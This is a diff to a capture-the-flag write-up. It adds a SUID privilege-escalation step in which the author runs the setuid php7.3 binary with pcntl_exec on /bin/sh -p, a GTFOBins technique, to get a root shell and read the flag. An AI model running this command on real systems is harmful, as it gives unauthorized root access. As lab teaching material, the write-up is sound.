@@ -58,5 +58,12 @@ which could lead to SUID privilege escalation. So I searched `GTFObins` and I fo
 So I ran:
 
 ```bash
-/usr/bin/php7.3
+cd /usr/bin
+./php7.3 -r "pcntl_exec('/bin/sh', ['-p']);"
 ```
+
+![](attachments/Pasted%20image%2020251127133550.png)
+
+So we got root privileges and we can read the `flag.txt`:
+
+![](attachments/Pasted%20image%2020251127133635.png)
